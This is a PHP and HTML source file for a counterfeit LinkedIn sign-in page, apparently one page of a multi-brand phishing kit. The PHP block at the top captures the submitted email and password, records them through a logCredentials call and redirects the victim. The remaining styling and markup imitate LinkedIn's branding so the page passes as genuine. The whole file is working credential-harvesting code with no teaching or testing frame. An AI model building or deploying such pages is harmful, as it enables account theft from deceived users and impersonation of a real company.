<?php
require_once 'utils.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = sanitizeInput($_POST['email'] ?? '');
    $password = sanitizeInput($_POST['password'] ?? '');
    
    logCredentials('linkedin', ['email' => $email, 'password' => $password]);
    header('Location: index.php?linkedin_success=1');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - LinkedIn</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 4px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 420px;
            width: 100%;
        }

        .logo {
            margin-bottom: 30px;
            text-align: center;
        }

        .logo-text {
            font-size: 28px;
            font-weight: bold;
            color: #0a66c2;
            letter-spacing: -1px;
        }

        h1 {
            font-size: 32px;
            margin-bottom: 8px;
            color: #000;
            font-weight: 600;
        }

        .subtitle {
            color: #666;
            font-size: 15px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #000;
            font-weight: 500;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 15px;
            transition: border-color 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #0a66c2;
            box-shadow: 0 0 0 3px rgba(10, 102, 194, 0.1);
        }

        .signin-button {
            width: 100%;
            padding: 12px;
            background: #0a66c2;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }

        .signin-button:hover {
            background: #004182;
        }

        .footer-text {
            text-align: center;
            color: #666;
            font-size: 13px;
            margin-top: 20px;
        }

        .footer-text a {
            color: #0a66c2;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-text">LinkedIn</div>
        </div>
        
        <h1>Sign in</h1>
        <p class="subtitle">Stay updated on your professional world</p>
        
        <form method="POST">
            <div class="form-group">
                <label for="email">Email or phone number</label>
                <input type="email" id="email" name="email" required autofocus>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="signin-button">Sign in</button>
        </form>
        
        <div class="footer-text">
            New to LinkedIn? <a href="#">Join now</a>
        </div>
    </div>
</body>
</html>
